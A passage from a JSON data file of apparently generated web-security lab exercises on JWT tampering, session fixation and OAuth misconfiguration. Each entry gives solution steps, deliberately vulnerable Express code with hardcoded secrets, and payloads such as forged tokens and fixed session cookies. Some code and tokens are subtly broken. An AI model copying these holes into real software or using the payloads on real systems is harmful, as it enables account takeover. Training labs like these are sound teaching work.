      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'supersecret'; const users = [{ username: 'admin', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secretKey); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, secretKey, (err, decoded) => { if (err) return res.status(403).send('Failed to authenticate token'); if (decoded.role === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('Forbidden'); } }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.eyJrZ44rt6kYXLItD5qIuw1JQ_a7hvvLfY7jAY-Jdft4oO9kMnsrtV5-5V0FQKxyw9ihpR0B5XjBze_DbfQWr5-M0aNNUuSc_-I56oD6Q8xADwlWb93YPrDA==",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.INVALID_SIGNATURE"
      ]
    },
    {
      "Lab scenario": "Session Fixation Attack via Cookie Manipulation",
      "Lab Description": "The application is vulnerable to session fixation attacks due to improper handling of session cookies. The goal is to hijack an existing session or fixate a session to gain unauthorized access.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the request using Burp Suite and observe how the session cookie is assigned during login.",
        "2. Attempt to set the session cookie value manually before logging in by using a fixed value.",
        "3. Log in with the fixed session cookie and check if the session persists even after authentication.",
        "4. Explore any accessible resources that should be restricted based on user roles and attempt to escalate privileges.",
        "5. Once access is gained, confirm successful exploitation by accessing the 'My Account' page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('session', 'fixed-session-id'); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.session === 'fixed-session-id') { res.send('Access granted'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "session=fixed-session-id",
        "session=random-session-id"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Leading to Access Token Leak",
      "Lab Description": "In this lab, the OAuth implementation is misconfigured, allowing an attacker to gain access to sensitive data by intercepting an access token. The goal is to retrieve the access token and use it to impersonate a user.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Launch a phishing attack to redirect the user to the authorization server and obtain the authorization code.",
        "2. Intercept the authorization code response using Burp Suite.",
        "3. Exchange the authorization code for an access token by sending a request to the token endpoint.",
        "4. Use the access token to impersonate the user and access protected resources.",
        "5. Verify the access control breach by accessing user-sensitive data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; const clientId = 'client-id'; const clientSecret = 'client-secret'; const authCode = 'authorization-code'; const accessToken = 'access-token'; app.get('/auth', (req, res) => { res.redirect('https://authorization-server.com?response_type=code&client_id=' + clientId + '&redirect_uri=http://localhost:4000/callback'); }); app.get('/callback', (req, res) => { const code = req.query.code; if (code === authCode) { res.json({ access_token: accessToken }); } }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer ' + accessToken) { res.send('User profile data'); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "authorization_code=authorization-code",
        "access_token=access-token"
      ]
    },
    {
      "Lab scenario": "Session Fixation Attack in RESTful API",
      "Lab Description": "The application suffers from a session fixation vulnerability. An attacker can set a valid session cookie before the victim logs in, allowing them to hijack the victim’s session once authenticated. To solve the lab, you must exploit this flaw to take control of Carlos's session after they log in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite's Proxy to intercept the login request and capture the session cookie. Manually set the session cookie to a fixed value before the victim logs in.",
        "2. With the fixed session cookie, send the login request for Carlos's account while observing the session cookie value.",
        "3. Upon successful login, confirm the cookie remains the same, ensuring it’s the fixed one.",
        "4. Verify that after Carlos logs in with the fixed session ID, you can access their account page and interact with their session.",
        "5. Clean up by logging out and ensuring no session is hijacked."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst users = [{ username: 'carlos', password: 'password123', session: 'abcd1234' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) { return res.status(401).send('Invalid credentials'); }\n  res.cookie('session', 'fixed-session-id');\n  res.send('Logged in');\n});\napp.get('/account', (req, res) => {\n  const session = req.cookies.session;\n  const user = users.find(u => u.session === session);\n  if (user) { res.send(`Welcome ${user.username}`); } else { res.send('Access denied'); }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running'));"
    },
    {
      "Lab scenario": "JWT Manipulation via Tampering",
      "Lab Description": "The application uses JWTs for authentication but the JWT payload is not validated properly. An attacker can manipulate the payload and alter their role to gain unauthorized access to an admin panel. To solve this lab, you must modify the JWT token to impersonate the admin and access restricted resources.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to capture the login request and identify the JWT token being sent in the Authorization header.",
        "2. Decode the JWT token using a tool like jwt.io to reveal the header, payload, and signature.",
        "3. Modify the payload to change the user's role from 'user' to 'admin'. Use a simple online tool to modify the base64-encoded payload.",
        "4. Re-sign the modified token with the same secret key (which can be guessed using a brute-force attack or known based on the application's behavior).",
        "5. Send the modified token back in the Authorization header of a request to access the admin panel and verify the successful exploitation.",
        "6. Clean up by logging out and ensuring no further admin access is possible without re-authentication."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'supersecretkey';\nconst users = [{ username: 'carlos', password: 'password123', role: 'user' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) { return res.status(401).send('Invalid credentials'); }\n  const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { expiresIn: '1h' });\n  res.json({ token });\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, secretKey);\n    if (decoded.role !== 'admin') { return res.status(403).send('Access denied'); }\n    res.send('Welcome Admin');\n  } catch (err) { res.status(401).send('Invalid token'); }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Manipulation Lab running'));"
    },
    {
      "Lab scenario": "OAuth Misconfiguration in GraphQL API",
      "Lab Description": "The application uses OAuth for authentication but the OAuth provider is misconfigured, allowing an attacker to impersonate any user by modifying the authorization token. To solve the lab, you must exploit this misconfiguration and access the profile of a user other than Carlos.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the OAuth token request using Burp Suite and capture the access token.",
        "2. Send the token to an OAuth introspection endpoint to view the associated user data.",
        "3. Identify the OAuth configuration flaw by inspecting the token scope or audience parameters.",
        "4. Manipulate the token to change the 'sub' (subject) claim to the username of another user, such as 'admin'.",
        "5. Use the modified token to make an authenticated request to the GraphQL API, retrieving the admin's profile or other sensitive data.",
        "6. Log out and confirm the exploit is no longer active by observing the token expiration or invalidation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express');\nconst { gql, ApolloServer } = require('apollo-server-express');\nconst app = express();\nlet users = [{ username: 'carlos', password: 'password123', role: 'user' }, { username: 'admin', password: 'admin123', role: 'admin' }];\nconst typeDefs = gql`\n  type Query {\n    profile: User\n  }\n  type User {\n    username: String\n    role: String\n  }\n`;\nconst resolvers = {\n  Query: {\n    profile: (parent, args, context) => {\n      return users.find(u => u.username === context.user);\n    }\n  }\n};\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  context: ({ req }) => {\n    const token = req.headers['authorization'].split(' ')[1];\n    const decoded = jwt.verify(token, 'supersecretkey');\n    return { user: decoded.username };  \n  }\n});\nserver.applyMiddleware({ app });\napp.listen(4000, () => console.log('OAuth Misconfiguration Lab running'));"
    },
    {
      "Lab scenario": "JWT Token Manipulation for Account Access",
      "Lab Description": "This lab contains an authentication vulnerability in JWT token handling. The application relies on the user's JWT token for maintaining a session. The token does not properly validate the claims inside it, allowing an attacker to manipulate the token. To solve this lab, manipulate the JWT token to escalate the user role to an admin and access Carlos's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the login request and capture the JWT token.",
        "2. Decode the JWT token using an online tool or Burp Suite.",
        "3. Modify the 'role' claim in the token to 'admin'.",
        "4. Re-encode the token and replace the old token with the modified one in the Authorization header.",
        "5. Access the /my-account endpoint to confirm if you have elevated access to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'mysecret'; let users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, secret, (err, decoded) => { if (err) return res.status(403).send('Unauthorized'); if (decoded.role !== 'admin') return res.status(403).send('Access denied'); res.send('Account details for Carlos'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "admin:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.nK9JH9RdkmOwznEbbvXpiAB6yXsPeyDWsxT9oeZ2lGUg",
        "user:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJ1c2VyIn0.SgLsT6LgN0fYzXiMoeNl3mXwQfCPpwn4a09N8ckjFhkA"
      ]
    },
    {
      "Lab scenario": "Session Fixation Attack",
      "Lab Description": "The application improperly manages session IDs. Even though the user logs in, the session ID is not regenerated on login. An attacker can set their own session ID before the victim logs in, effectively hijacking the session. To solve this lab, perform a session fixation attack to access Carlos's account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Set a custom session ID using Burp Suite or by manually modifying the session cookie in the browser.",
        "2. Have the victim log in with valid credentials while keeping the custom session ID.",
        "3. Use the session ID obtained after login to access the /my-account page.",
        "4. Validate if the session ID used belongs to the victim after accessing their account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.cookie('sessionID', '123456'); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const { sessionID } = req.cookies; if (sessionID !== '123456') return res.status(403).send('Access denied'); res.send('Account details for Carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "sessionID=custom12345",
        "sessionID=123456"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration Leading to Unauthorized Access",
      "Lab Description": "This lab is vulnerable to improper OAuth configuration, which results in users being able to access other users' resources. The OAuth token request does not properly restrict access to the user's data. To solve this lab, use an OAuth token to access Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Start by reviewing the OAuth flow and intercept the request using Burp Suite.",
        "2. Inspect the scope parameter in the OAuth authorization request and identify that it grants access to other users' data.",
        "3. Use the authorization code obtained to generate an access token for Carlos's account.",
        "4. Send the access token in the Authorization header to gain access to Carlos's account page.",
        "5. Confirm that unauthorized access is granted to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const oauth = require('oauth2-server'); const app = express(); let users = [{ username: 'carlos', password: 'password123', id: 1 }]; const oauthServer = new oauth.Server(); app.post('/token', (req, res) => { const { code } = req.body; const token = oauthServer.exchange({ code }); res.json({ access_token: token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; oauthServer.authenticate({ access_token: token }, (err, user) => { if (err) return res.status(403).send('Access denied'); res.send(`Account details for ${user.username}`); }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "access_token=valid-oauth-token-for-carlos",
        "access_token=invalid-oauth-token"
      ]
    },
    {
      "Lab scenario": "JWT token tampering with admin access",
      "Lab Description": "In this lab, a vulnerable JWT-based authentication mechanism is present. The application uses JWT tokens for access control, but the secret key is weak and can be guessed. To solve the lab, the JWT token needs to be tampered with to elevate the user's privileges and access the admin page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Capture the JWT token from the 'Authorization' header using Burp Suite's Proxy.",
        "2. Decrypt the JWT token using a base64 decoding tool to retrieve the payload.",
        "3. Modify the payload to change the 'role' field from 'user' to 'admin'.",
        "4. Re-encode the modified payload and create a new JWT token.",
        "5. Send the modified JWT token in the 'Authorization' header of a request to the server using Burp Suite's Repeater.",
        "6. If the server responds with admin access, the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst secretKey = 'weakSecret';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user' && password === 'password123') {\n    const token = jwt.sign({ username: 'user', role: 'user' }, secretKey, { expiresIn: '1h' });\n    return res.json({ token });\n  }\n  return res.status(401).json({ error: 'Invalid credentials' });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token) return res.status(401).json({ error: 'No token provided' });\n  jwt.verify(token, secretKey, (err, decoded) => {\n    if (err) return res.status(401).json({ error: 'Invalid token' });\n    if (decoded.role !== 'admin') return res.status(403).json({ error: 'Forbidden' });\n    res.send('Welcome to the admin panel');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTYzMzMyMDR9.9G53KDmcuhgfXz1xF2ZIiStZWZTtIHUSuC9NOhOdR4Y",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTYzMzMyMDR9.9G53KDmcuhgfXz1xF2ZIiStZWZTtIHUSuC9NOhOdR4Y"
      ]
    },
    {
      "Lab scenario": "Session fixation attack with session hijacking",
      "Lab Description": "The application is vulnerable to a session fixation attack, where the attacker can set a session ID before the user logs in. By exploiting this vulnerability, the attacker can hijack a user's session. To solve the lab, exploit the session fixation flaw and gain access to the victim's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Set a custom session ID in your browser using Burp Suite's Intercept feature.",
        "2. Login to the victim's account using their credentials and submit the session ID you set previously.",
        "3. Check if the application maintains the session after logging in with the custom ID.",
        "4. If the session ID is maintained, access the victim's account page using the hijacked session.",
        "5. If the account page loads successfully, the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'superSecret', resave: false, saveUninitialized: true }));\n\nconst users = [{ username: 'carlos', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.username = username;\n    return res.send('Logged in');\n  }\n  return res.status(401).send('Invalid credentials');\n});\n\napp.get('/my-account', (req, res) => {\n  if (req.session.username) {\n    res.send('Account details for ' + req.session.username);\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));",
      "payloads": [
        "SESSION_ID=xyz1234567890",
        "SESSION_ID=abc0987654321"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leading to unauthorized access",
      "Lab Description": "This lab's OAuth 2.0 implementation is misconfigured, allowing users to access sensitive endpoints without proper authorization. By exploiting this misconfiguration, the attacker can gain unauthorized access to the admin panel. To solve the lab, perform an OAuth flow that grants admin access.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Capture the OAuth token request using Burp Suite's Proxy.",
        "2. Inspect the OAuth request and identify the 'scope' parameter, which may indicate a privileged access level.",
        "3. Modify the scope to request 'admin' access instead of the default user access.",
        "4. Send the modified request and obtain an OAuth token with admin privileges.",
        "5. Use the token to access the admin panel and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express');\nconst oauth2 = require('simple-oauth2');\nconst app = express();\n\nconst oauth2Client = oauth2.create({\n  client: { id: 'myClientId', secret: 'myClientSecret' },\n  auth: { tokenHost: 'http://localhost:3000' }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { scope } = req.body;\n  if (scope === 'admin') {\n    return res.json({ access_token: 'adminToken123' });\n  } else {\n    return res.json({ access_token: 'userToken123' });\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization'];\n  if (token === 'adminToken123') {\n    return res.send('Welcome to the admin panel');\n  }\n  return res.status(403).send('Access denied');\n});\n\napp.listen(3000, () => console.log('OAuth Misconfiguration Lab running on http://localhost:3000'));",
      "payloads": [
        "grant_type=password&username=admin&password=admin123&scope=admin",
        "grant_type=authorization_code&code=authCode123&scope=admin"
      ]
    },
    {
      "Lab scenario": "JWT tampering for unauthorized access",
      "Lab Description": "This lab involves a vulnerable JWT-based authentication system. The application uses JWT tokens for session management but improperly validates the token signature. To solve the lab, you need to intercept and modify the JWT to impersonate a different user and access their account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the login request. Capture the JWT in the Authorization header of the response.",
        "2. Examine the JWT structure and note that it contains three parts: header, payload, and signature. Decode the header and payload using an online JWT decoder.",
        "3. Use a tool like JWT.io to sign the JWT manually with a known key (found by brute-forcing or trial and error), then replace the signature with the newly generated one.",
        "4. Send the modified JWT back in the Authorization header of a request to access the target user's account page.",
        "5. Verify that you now have access to the user’s account, thus solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'admin', password: 'password123', role: 'admin' }, { username: 'user', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = jwt.sign({ username: user.username, role: user.role }, 'secretKey'); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, 'secretKey', (err, decoded) => { if (err) return res.status(500).send('Failed to authenticate token'); res.send('Account of ' + decoded.username); }); }); const PORT = 3000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
      "payloads": [
        "Bearer <modified_JWT_token>"
      ]
    },
    {
      "Lab scenario": "Session fixation attack via cookie manipulation",
      "Lab Description": "This lab involves a vulnerable session management mechanism where the session ID is set by the server in a predictable way. By manipulating the session cookie, you can hijack the session and access the victim's account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Start by logging in with your own credentials and observe the session cookie set by the server in the response.",
        "2. Using Burp Suite or browser dev tools, intercept and modify the session cookie. Set the session cookie to a known valid session ID for another user (e.g., 'admin').",
        "3. Send the modified cookie back in a request to access the victim's account.",
        "4. Verify that the account page now loads for the victim's account, thus completing the session fixation attack."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { admin: { password: 'admin123', session: 'adminSession' }, user: { password: 'user123', session: 'userSession' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.cookie('session', users[username].session); res.send('Logged in as ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; if (!session || !Object.values(users).some(u => u.session === session)) { return res.status(403).send('Access denied'); } const user = Object.keys(users).find(u => users[u].session === session); res.send('Welcome ' + user); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
      "payloads": [
        "session=adminSession"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leading to unauthorized access",
      "Lab Description": "This lab involves a misconfigured OAuth implementation, allowing users to access sensitive information without proper authorization. The goal is to gain access to an admin's account by exploiting the OAuth flow.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the OAuth authorization request. Identify the authorization code in the URL after the user authenticates.",
        "2. Exchange the authorization code for an access token using the OAuth token endpoint.",
        "3. Using the access token, make an API request to retrieve sensitive user data. Observe that the API does not properly check user roles or permissions, allowing unauthorized access.",
        "4. Use the token to gain admin access to the target user's account and confirm the successful exploitation of the OAuth misconfiguration."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const request = require('request'); const app = express(); app.use(bodyParser.json()); const oauthConfig = { clientId: 'client123', clientSecret: 'secretKey', authorizationEndpoint: '/oauth/authorize', tokenEndpoint: '/oauth/token' }; let users = { user1: { role: 'user' }, admin: { role: 'admin' } }; app.get('/oauth/authorize', (req, res) => { const { code } = req.query; if (code) { res.redirect('/oauth/token?code=' + code); } else { res.send('Missing code'); } }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'validCode') { res.json({ access_token: 'token123' }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token123') { res.json({ username: 'admin', role: 'admin' }); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
      "payloads": [
        "code=validCode",
        "Authorization: Bearer token123"
      ]
    },
    {
      "Lab scenario": "JWT Token Manipulation in Authorization Header",
      "Lab Description": "The application uses JWT for user authentication. A flaw exists in how JWTs are validated, allowing attackers to manipulate the token to bypass authorization. To solve the lab, craft a tampered JWT token with the role 'admin' and use it to access Carlos's admin page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the login request with Burp Suite and capture the JWT token.",
        "2. Decode the JWT token using a tool like jwt.io to inspect the header, payload, and signature.",
        "3. Modify the 'role' field in the payload to 'admin'. Re-encode the JWT token, ensuring the structure remains intact.",
        "4. Send the tampered JWT token as an Authorization header in a request to the /admin endpoint.",
        "5. If the server grants access to the admin page, the lab is solved."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'mysecret'; const users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secret); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (token) { jwt.verify(token, secret, (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Forbidden'); res.send('Welcome to the admin page'); }); } else { res.status(401).send('Authorization required'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "OAuth Misconfiguration in Third-party Service",
      "Lab Description": "The application allows users to authenticate via a third-party OAuth provider. Due to misconfigurations, it allows an attacker to obtain a valid access token and impersonate any user. To solve the lab, acquire an access token for Carlos and use it to gain unauthorized access to his profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Initiate the OAuth authorization flow with Burp Suite to capture the authorization code.",
        "2. Analyze the OAuth callback URL to observe that the application is not validating redirect URIs.",
        "3. Manipulate the redirect URI to redirect to a malicious server that you control.",
        "4. Capture the authorization code sent to your server and exchange it for an access token using the OAuth provider's token endpoint.",
        "5. Use the obtained access token to access Carlos's user profile endpoint and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/login', (req, res) => { const authUrl = 'https://thirdparty-oauth-provider.com/auth?client_id=myclient&redirect_uri=http://localhost:3000/callback'; res.redirect(authUrl); }); app.get('/callback', async (req, res) => { const { code } = req.query; const response = await axios.post('https://thirdparty-oauth-provider.com/token', { code, client_id: 'myclient', client_secret: 'mysecret', redirect_uri: 'http://localhost:3000/callback' }); const token = response.data.access_token; res.send(`Access token: ${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token) { res.send(`Welcome to your profile! Token: ${token}`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));"
    },
    {
      "Lab scenario": "Session Fixation Attack via URL Parameter",
      "Lab Description": "The application is vulnerable to session fixation attacks where the session ID is passed via a URL parameter. An attacker can fix the victim's session ID and hijack their session. To solve the lab, fix Carlos's session ID to your own and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Log in to your own account and notice that a session ID is passed as a URL parameter (e.g., /dashboard?sessionID=xyz123).",
        "2. Manually modify the session ID parameter to set it to a value of your choosing.",
        "3. Send a request to the /login endpoint with the manipulated session ID in the URL.",
        "4. Observe the response to confirm that the session ID is accepted and your session is now linked to Carlos's account.",
        "5. Access Carlos's account page using the hijacked session and solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionId = req.query.sessionID || Math.random().toString(36).substr(2, 9); sessions[sessionId] = user.username; res.send(`Logged in with session ID: ${sessionId}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sessionId = req.query.sessionID; if (sessions[sessionId]) { res.send(`Welcome, ${sessions[sessionId]}!`); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));"
    },
  
    {
      "Lab scenario": "Session Fixation via Predictable Session ID",
      "Lab Description": "In this lab, session fixation occurs because the server assigns a predictable session ID to the user when they log in. The attacker can set a session ID in advance, making it possible to hijack the session after the victim logs in. To solve the lab, force the server to accept a fixed session ID and gain access to Carlos's account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Start a Burp Suite session and intercept the login request for your own account.",
        "2. Notice that a session ID is set in the response cookies. Observe its predictable pattern and set it as a fixed value for further exploitation.",
        "3. Log out and send the login request to Burp Suite with the fixed session ID set in the cookie.",
        "4. After successfully logging in with your own credentials, send the fixed session ID to Burp Repeater, modify the username parameter to 'carlos', and submit the request.",
        "5. Confirm that the session ID is reused for Carlos's account, and access the 'My Account' page to solve the lab."
      ],
      "Vulnerability name": "Authentication",
      "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(require('cookie-parser')()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password, session } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } res.cookie('session', session || 'abcd1234'); res.send('Login successful'); }); app.get('/account', (req, res) => { const { session } = req.cookies; const user = users.find(u => u.username === 'carlos'); if (user && session === 'abcd1234') { res.send('Account details for Carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
      "payloads": [
        "session=abcd1234"
      ]
    },
    {
      "Lab scenario": "JWT Tampering in Authorization Header",
      "Lab Description": "This lab demonstrates a vulnerability where the JWT token is not properly signed, allowing for tampering of user data. The application does not properly verify the JWT's integrity, allowing an attacker to modify the token to impersonate Carlos and gain access to his account. To solve the lab, modify the JWT and access Carlos's account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the login request in Burp Suite and capture the JWT token in the Authorization header.",
        "2. Use a JWT decoder (e.g., jwt.io) to decode the token and understand its structure.",
        "3. Modify the payload to change the 'sub' (subject) field to 'carlos', and base64-encode the modified JWT payload.",
        "4. Replace the original JWT token with the modified one and send the request again using Burp Suite.",
        "5. Verify that the application grants access to Carlos's account when the tampered token is used, solving the lab."
      ],
      "Vulnerability name": "Authentication",
